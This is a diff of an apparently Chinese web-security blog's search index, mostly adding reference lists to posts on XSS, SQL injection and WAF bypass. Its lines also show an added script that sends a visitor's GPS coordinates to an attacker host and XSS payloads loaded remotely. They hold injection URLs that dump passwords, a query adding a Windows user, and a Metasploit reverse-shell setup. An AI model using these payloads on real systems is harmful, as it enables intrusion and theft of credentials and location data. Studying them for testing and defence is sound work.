@@ -2670,6 +2670,11 @@
 <p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
 <p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
 <p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>邱永华 著《XSS跨站脚本攻击剖析与防御》</li>
+<li><a href="https://www.cnblogs.com/csnd/p/11807592.html">XSS(跨站脚本攻击)详解 - 墨鱼菜鸡 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://owasp.org/Top10/">OWASP Top 10:2021</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -2946,6 +2951,16 @@
 <p>使用示例：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-user-modify:read-write&quot;</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="远程加载Payload"><a href="#远程加载Payload" class="headerlink" title="远程加载Payload"></a>远程加载Payload</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.123.42/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&quot;<span class="attr">appendChild</span>(<span class="attr">createElement</span>(&#x27;<span class="attr">script</span>&#x27;))<span class="attr">.src</span>=<span class="string">&#x27;http://192.168.123.42/xss.js&#x27;</span>&quot;)&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><p>ZP《XSS绕过+宝塔WAF绕过》</p>
+</li>
+<li><p><a href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA">深入探究浏览器编码及XSS Bypass (qq.com)</a></p>
+</li>
+<li><p><a href="https://segmentfault.com/a/1190000038468748#shareToWeibo|">问我Chrome浏览器的渲染原理（6000字长文） - SegmentFault 思否</a></p>
+</li>
+<li><p><a href="https://www.freebuf.com/articles/web/200180.html">看我如何绕过WAF的XSS检测机制 - FreeBuf网络安全行业门户</a></p>
+</li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3118,7 +3133,17 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2Fhackmee.com%2Fattack%2Fxss_probe.js%22%3E%3C%2Fscript%3E#</span><br></pre></td></tr></table></figure>
 <p>当受害者访问我们构造的恶意链接，data.html便会记录客户端的信息。</p>
 <p><img src="https://i.loli.net/2021/11/13/OiV8Bc5P3QWIjED.png" alt="image-20211113223745241"></p>
+<h2 id="获取经纬度定位"><a href="#获取经纬度定位" class="headerlink" title="获取经纬度定位"></a>获取经纬度定位</h2><p>注意：获取经纬度的方法只可以在https协议的网站上才可使用。</p>
+<p>gps.js</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (navigator.geolocation)</span><br><span class="line">    &#123;</span><br><span class="line">    navigator.geolocation.getCurrentPosition(showPosition);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;x.innerHTML=<span class="string">&quot;Geolocation is not supported by this browser.&quot;</span>;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPosition</span>(<span class="params">position</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="keyword">new</span> Image()).src=<span class="string">&#x27;http://hackmee.com/attack/gps.php?do=api&amp;id=&#123;projectId&#125;&amp;weidu=&#x27;</span>+position.coords.latitude+<span class="string">&#x27;&amp;jingdu=&#x27;</span>+position.coords.longitude;</span><br><span class="line">&#125;</span><br><span class="line">       </span><br><span class="line">getLocation();</span><br></pre></td></tr></table></figure>
+<p>gps.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$weidu</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;weidu&#x27;</span>];</span><br><span class="line">    <span class="variable">$jingdu</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;jingdu&#x27;</span>];</span><br><span class="line">    <span class="variable">$log</span> = fopen(<span class="string">&quot;gps.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$id</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="string">&quot;-维度:&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$weidu</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="string">&quot;-经度:&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$jingdu</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>以上就是一些XSS的常见利用手段的剖析，在我们实战过程中可以使用XSS攻击平台对漏洞进行多维利用。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>邱永华 著《XSS跨站脚本攻击剖析与防御》</li>
+<li>吴翰清 著《白帽子讲Web安全》</li>
+<li><a href="https://blog.csdn.net/eT48_sec/article/details/42193903"> XSS信息刺探脚本_eT48_Sec-CSDN博客</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3389,6 +3414,14 @@
 <p>此处调用了html()做输出，仅考虑单引号双引号以及尖括号显然已经不够了，还必须得考虑别的因素在里面，此时应该再使用json_encode()函数进行处理。即：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#text&#x27;</span>).html(<span class="string">&quot;.htmlspecialchars(<span class="subst">$name</span>).&quot;</span>);</span><br><span class="line">修改为</span><br><span class="line">$(<span class="string">&#x27;#text&#x27;</span>).html(<span class="string">&quot;.json_encode(htmlspecialchars(<span class="subst">$name</span>)).&quot;</span>);</span><br></pre></td></tr></table></figure>
 <p>处理之后，里边的代码就不会被当成js执行。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>暗月 编《渗透测试手册WEB安全漏洞》</li>
+<li><a href="https://www.zhihu.com/question/27646993">XSS 攻击时怎么绕过 htmlspecialchars 函数呢？ - 知乎 (zhihu.com)</a></li>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-Site Scripting (XSS) Cheat Sheet - 2021 Edition | Web Security Academy (portswigger.net)</a></li>
+<li><a href="https://www.freebuf.com/articles/web/226719.html">2020年仍然有效的一些XSS Payload - FreeBuf网络安全行业门户</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1730672">长亭WAF XSS防护绕过小记 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://www.bilibili.com/video/BV1344y1e7qe?from=search&amp;seid=11452777208324676064&amp;spm_id_from=333.337.0.0">第十八课 - XSS fetch_哔哩哔哩_bilibili</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3475,6 +3508,11 @@
 <li><p>对用户敏感信息特别是密码做严格加密处理。</p>
 </li>
 </ol>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
+<li><a href="https://www.jianshu.com/p/42fbb8066704">OWASP TOP10之sql注入简述 - 简书 (jianshu.com)</a></li>
+<li><a href="https://blog.csdn.net/ski_12/article/details/78299460">PHP代码审计实战之盾灵CMS_Mi1k7ea-CSDN博客</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3680,6 +3718,11 @@
 <p>但测试下来只有%0d可以绕过，且能正常爆出数据</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/index.aspx?id=-1--%0dunion select 1,username,password from dbo.users</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/23/sLJWBAZdjR7DPEz.png" alt="image-20211023152418680"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>ZP《Bypass云锁mysql注入》</li>
+<li>ZP《Bypass云锁mssql注入》</li>
+<li><a href="http://www.alexsel.com/index.php/archives/77/">10种方法绕过云锁以及tamper - Cyberpunk (alexsel.com)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3705,6 +3748,10 @@
 <blockquote>
 <p>注：宝塔的规则也写得非常严格，单从规则的角度来看无法完美地实现绕过，且Apache也不像IIS，能利用的协议特性较少，暂时只这发现这一种绕过思路。</p>
 </blockquote>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://blog.csdn.net/qq_26090065/article/details/81458937">00截断原理分析_小水池-CSDN博客_00截断</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3857,6 +3904,12 @@
 <p>from的绕过这就是一个技术活了，这里是利用到了HPP以及%00截断来进行绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1.eunion--%26%67%74%3b%0aselect NULL,username,password/*%26%67%74%3b&amp;id=%00%0d*/from users </span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/28/52ovwzqNIPcZxCl.png" alt="image-20211028174713969"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>ZP《BypassD盾mssql注入》</li>
+<li><a href="https://blog.csdn.net/zhangge3663/article/details/116394692">干货|各种WAF绕过手法学习_zhangge3663的博客-CSDN博客</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903605&amp;idx=1&amp;sn=5a8df50ef8efbd5293fcf3a8712cd1b8&amp;scene=21#wechat_redirect">Bypass D盾_防火墙（新版）SQL注入防御 (qq.com)</a></li>
+<li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -3896,6 +3949,9 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">😠、🧠、🍠、🥠、🚠、🎠、🌠、🛠、☠、⚠️、💠、🔠、🕠、🏴󠁧󠁢󠁥󠁮󠁧󠁿、🏴󠁧󠁢󠁳󠁣󠁴󠁿、🏴󠁧󠁢󠁷󠁬󠁳󠁿</span><br></pre></td></tr></table></figure>
 <p>绕过成功！</p>
 <p><img src="https://i.loli.net/2021/11/01/BGnI9ZMxwD6dOe5.png" alt="image-20211101161052717"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://documentation.help/InfoSec-cn/55b41898-7649-40b7-8ee7-ab517fad48ac.htm">Bypass阿里云盾、百度云加速、安全宝、安全狗、云锁、360主机卫士SQL注入防御 - Documentation</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -4009,6 +4065,12 @@
 <p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049574.png" alt="b5659dd25557a61d426a429464efbf91.png"></p>
 <p>将<code>1 or 1=1 #</code>进行Base64编码后，带入查询</p>
 <p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048366.png" alt="43ed3fdc2f3913b68725e2f4777b9277.png"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
+<li><a href="https://blog.csdn.net/a15803617402/article/details/82939202">WEB安全学习——Json注入_尚未佩妥剑 转眼便江湖-CSDN博客_json注入</a></li>
+<li><a href="https://blog.csdn.net/Drifter_Galaxy/article/details/108678793">SQL注入之 base64注入攻击_coderge的博客-CSDN博客_base64注入</a></li>
+<li><a href="https://baike.baidu.com/item/X-Forwarded-For/3593639">X-Forwarded-For_百度百科 (baidu.com)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -4341,6 +4403,18 @@
 <h3 id="PostgreSQL字符串特性绕过"><a href="#PostgreSQL字符串特性绕过" class="headerlink" title="PostgreSQL字符串特性绕过"></a>PostgreSQL字符串特性绕过</h3><p>由于 postgres 会将双引号中的内容认为是一个表名/字段名，同时在双引号引起的字符串中使用 U&amp; 前缀转义是合法的，所以当过滤了 information_schema 等关键名称时，可以将其用双引号引用并在其前面 加入 U&amp;转义前缀，同时将其中某个字符替换为对应的 Unicode 表现形式来绕过 WAF。</p>
 <p>例如：以下语句同样会返回所有的 Schema</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;tabl\0065_sch\0065ma&quot; <span class="keyword">from</span> U<span class="operator">&amp;</span>&quot;inform\0061tion_sch\0065ma&quot;.U<span class="operator">&amp;</span>&quot;t\0061bles&quot; <span class="keyword">where</span> </span><br><span class="line">U<span class="operator">&amp;</span>&quot;tabl\0065_sch\0065ma&quot; <span class="keyword">not</span> <span class="keyword">in</span> (U<span class="operator">&amp;</span><span class="string">&#x27;pg_cat\0061log&#x27;</span>,U<span class="operator">&amp;</span><span class="string">&#x27;inform\0061tion_sch\0065ma&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://blog.csdn.net/Fly_hps/article/details/86626985">WAF攻防研究之四个层次Bypass WAF<em>Fly</em>鹏程万里-CSDN博客</a></li>
+<li>ZP《BypassD盾mssql注入》</li>
+<li>暗月 编《渗透测试手册WEB安全漏洞》</li>
+<li><a href="https://cloud.tencent.com/developer/article/1605492?from=article.detail.1813470">那些可以绕过WAF的各种特性 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="http://github.wh0ale.xyz/2019/12/04/waf从入门到Bypass/">waf从入门到Bypass | Wh0ale’s Blog</a></li>
+<li><a href="https://blog.csdn.net/zhangge3663/article/details/116394692">干货|各种WAF绕过手法学习_zhangge3663的博客-CSDN博客</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903698&amp;idx=1&amp;sn=54df1b51cdfc5f274bebe31088786ae7&amp;scene=21#wechat_redirect">Bypass ngx_lua_waf SQL注入防御（多姿势） (qq.com)</a></li>
+<li><a href="https://www.cnblogs.com/renhaoblog/p/13395539.html">利用分块传输绕WAF - renblog - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.freebuf.com/sectool/193659.html">技术讨论 | 在HTTP协议层面绕过WAF - FreeBuf网络安全行业门户</a></li>
+<li>zcgonvh 编《Postgres注入方式总结》</li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -4461,6 +4535,10 @@
 <h3 id="判断回显位-2"><a href="#判断回显位-2" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,2,3,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
 <h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,username,password,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/ee9bf1be05fbedb60937a69027ca9399.png" alt="ee9bf1be05fbedb60937a69027ca9399.png"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
+<li><a href="https://blog.csdn.net/zhangliu463884153/article/details/80029053">SQL注入系列之ASP+ACCESS手动注入(二)——Cookie注入_你身后的人-CSDN博客</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -4983,6 +5061,19 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql账号密码</span></span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标主机ip和端口</span></span><br><span class="line">set rhost 192.168.26.174</span><br><span class="line">set rport 3306</span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收shell的ip和端口</span></span><br><span class="line">set lhost 192.168.26.129</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>返回的是system权限</p>
 <p><img src="https://i.loli.net/2021/10/05/Cxykrgh2HWib3qQ.png" alt="img"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
+<li>吴翰清 著《白帽子讲Web安全》</li>
+<li><a href="https://blog.csdn.net/weixin_44925883/article/details/116324005">二次注入 &amp; Sqli-labs Less 24_信安小菜鸡的博客-CSDN博客</a></li>
+<li><a href="https://blog.csdn.net/qq_28786023/article/details/108820124">SQL注入（宽字节注入、长字符截断）_ustcsse2019-lee的博客-CSDN博客_sql注入截断</a></li>
+<li><a href="https://www.cnblogs.com/xiaozi/p/12767050.html">MySQL注入点写入WebShell的几种方式 - Bypass - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.cnblogs.com/renhaoblog/p/12912452.html">利用DNS实现SQL注入带外查询（OOB） - renblog - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/33727367">Dnslog在SQL注入中的实战 - 知乎 (zhihu.com)</a></li>
+<li><a href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></li>
+<li><a href="https://www.cnblogs.com/AirSky/p/Mysql_UDF_PROMOTION_PRIVILEGE.html">Mysql UDF提权方法 - AirSkys - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.cnblogs.com/zzjdbk/p/12991468.html">MySQL提权之mof提权 - My_Dreams - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.alienchen.cn/45.html">MySQL提权之MOF - A’s Wor1d (alienchen.cn)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -5686,6 +5777,15 @@
 <p><img src="https://i.loli.net/2021/11/04/cvpduIW6sehoQHf.png" alt="image-20211104155959079"></p>
 <p>但是我们把sqlmap生成的payload拿去做手工注入却可以爆出所有数据库名</p>
 <p><img src="https://i.loli.net/2021/11/04/gq2D45iwRYAMy7L.png" alt="image-20211104160159787"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>陈小兵，蒋劭捷，张胜生 著《网络攻防实战研究》</li>
+<li>陈小兵，赵春，姜海，薛继东，黄电 著《sqlmap从入门到精通》</li>
+<li><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户</a></li>
+<li><a href="https://blog.csdn.net/weixin_45785288/article/details/109696575">sqlmap之tamper脚本_L1ni01-CSDN博客</a></li>
+<li><a href="https://blog.csdn.net/dyw_666666/article/details/83148684">sqlmap绕过过滤的tamper脚本分类汇总_烟敛寒林的博客-CSDN博客_sqlmap 绕过关键字过滤</a></li>
+<li><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">sqlmap的使用 —— 自带绕过脚本tamper_wkend的博客-CSDN博客_sqlmap tamper脚本</a></li>
+<li><a href="https://www.cnblogs.com/Cl0ud/p/14394627.html">SQLMap tamper编写 - 春告鳥 - 博客园 (cnblogs.com)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -5892,6 +5992,14 @@
 <p><strong>执行命令</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;cmd.exe /c net user estelle 123456 /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
 <p>注：该方法在32位系统下会出错</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://baike.baidu.com/item/SQLSERVER数据库/8979184">SQLserver数据库_百度百科 (baidu.com)</a></li>
+<li><a href="https://www.w3cschool.cn/t_sql/">T-SQL 教程_w3cschool</a></li>
+<li><a href="https://www.cnblogs.com/c123321/p/5528315.html">﻿﻿﻿﻿SQL Server中默认数据库和默认表的作用 - 张荣建 - 博客园 (cnblogs.com)</a></li>
+<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
+<li><a href="https://blog.csdn.net/weixin_45634365/article/details/114361769">MSSQL-反弹注入_弈-剑的博客-CSDN博客_mssql反弹注入</a></li>
+<li><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权_baynk的博客-CSDN博客_sp_oacreate提权</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -6157,6 +6265,14 @@
 <p>shell命令行输入：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -vv -l p 8080</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061110384.png" alt="image-20211006110855525" style="zoom:50%;"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://blog.csdn.net/wise_man/article/details/5288918">Oracle grant revoke 总结_wise_man的专栏-CSDN博客</a></li>
+<li><a href="https://www.cnblogs.com/yw0219/p/5855210.html">Oracle权限管理详解 - 舒山 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://mp.weixin.qq.com/s/MYkvQDpYZbz67F6qK9Ri0g">看了这个,谁还怕Oracle注入?(有彩蛋) (qq.com)</a></li>
+<li><a href="https://www.cnblogs.com/-qing-/p/10949562.html">Oracle报错注入总结 - 卿先生 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/">Oracle注入 - 命令执行&amp;Shell反弹 | redn3ck’s blog</a></li>
+<li><a href="https://www.cnblogs.com/micr067/p/12763325.html">Oracle数据库提权 - micr067 - 博客园 (cnblogs.com)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -6501,6 +6617,11 @@
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> test(<span class="string">&#x27;192.168.1.10&#x27;</span>,<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/11/tEv3xQnz4f29kVg.png" alt="QQ截图20211011230000"></p>
 <p>至此对 postgres UDF函数利用已经结束了，得到一个与数据库进程相同权限的 Shell 已经是能够通过注入点获取到的最高权限了(在 linux 下为 postgres 用户权限，windows 下为 Network Services)。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://blog.csdn.net/qq_36213352/article/details/117857045">PostgreSQL介绍_孙霸天-CSDN博客_postgresql</a></li>
+<li><a href="https://www.php.cn/manual/view/20866.html">II. 客户端应用程序 - [ PostgreSQL 手册 ] (php.cn)</a></li>
+<li>zcgonvh 编《Postgres注入方式总结》</li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -6580,7 +6701,7 @@
 <h3 id="旁路模式"><a href="#旁路模式" class="headerlink" title="旁路模式"></a>旁路模式</h3><p>利用交换机的端口镜像功能，将业务流量转发一份给WAF，WAF只对业务流量进行监控和报警，不进行拦截阻断。对于WAF而言，流量只进不出。</p>
 <p>该模式的特点是：在WAF出故障的情况下，不影响业务连续性。但是需要联动其他设备(如出口防火墙)来下发阻断策略。</p>
 <p><img src="https://i.loli.net/2021/10/13/jUYgnTHedQFhISW.png" alt="image-20211013204644602"></p>
-<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件 + 检测引擎模式"></a>软件嵌入中间件 + 检测引擎模式</h3><p>在使用 Nginx 作为反向代理的业务下，WAF 提供 Nginx 模块嵌入原有 Nginx，将请求转发给检测引擎，可以做到在不改动原有网络拓扑的情况下完成检测任务。</p>
+<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件 + 检测引擎模式"></a>软件嵌入中间件 + 检测引擎模式</h3><p>​    </p>
 <p><img src="https://i.loli.net/2021/10/13/GZwQ5FTdUfJ1a8S.png" alt="image-20211013204950399"></p>
 <h2 id="WAF绕过的实现"><a href="#WAF绕过的实现" class="headerlink" title="WAF绕过的实现"></a>WAF绕过的实现</h2><h3 id="WAF为什么会被绕过？"><a href="#WAF为什么会被绕过？" class="headerlink" title="WAF为什么会被绕过？"></a>WAF为什么会被绕过？</h3><ul>
 <li>鱼（安全）与 熊掌（业务性能）不可兼得</li>
@@ -6617,6 +6738,12 @@
 <h3 id="华为云"><a href="#华为云" class="headerlink" title="华为云"></a>华为云</h3><p><img src="https://i.loli.net/2021/10/13/oFm8vNZaPTt1jOb.png" alt="img"></p>
 <h3 id="360webscan"><a href="#360webscan" class="headerlink" title="360webscan"></a>360webscan</h3><p><img src="https://i.loli.net/2021/10/13/PaAlbG5K86RQzq1.png" alt="img"></p>
 <h3 id="360安域"><a href="#360安域" class="headerlink" title="360安域"></a>360安域</h3><p><img src="https://i.loli.net/2021/10/13/cDw6SLsRe3QBAb1.png" alt="image-20211013234002168"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>ZP《Bypass安全狗mysql注入》</li>
+<li><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇 - FreeBuf网络安全行业门户</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1728133">干货 | 常见WAF拦截页面总结 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://mp.weixin.qq.com/s/kRrELJquobgnXXz2ItRNxw">Waf识别工具和83个Waf拦截页面 (qq.com)</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -6816,6 +6943,13 @@
 <li>使用多行注释符/**/来闭合分割参数的逗号</li>
 </ul>
 <p><img src="https://i.loli.net/2021/10/27/SxH8TCOv2LsNBgQ.png" alt="image-20211027201228560"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>ZP《Bypass安全狗mysql注入》</li>
+<li><a href="https://cloud.tencent.com/developer/article/1856698?from=article.detail.1631936">SQL注入 安全狗apache4.0.26655绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1631936?from=article.detail.1856683">Fuzz绕过安全狗4.0实现SQL注入 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1856683">SQL注入-安全狗超大数据包绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://blog.csdn.net/weixin_50464560/article/details/120182543">Bypass WAF之HTTP参数污染(HPP)漏洞挖掘_J0hnson666的博客-CSDN博客</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -6824,6 +6958,111 @@
       <tags>
         <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS利用方式剖析</title>
+    <url>/post/a27c520e.html</url>
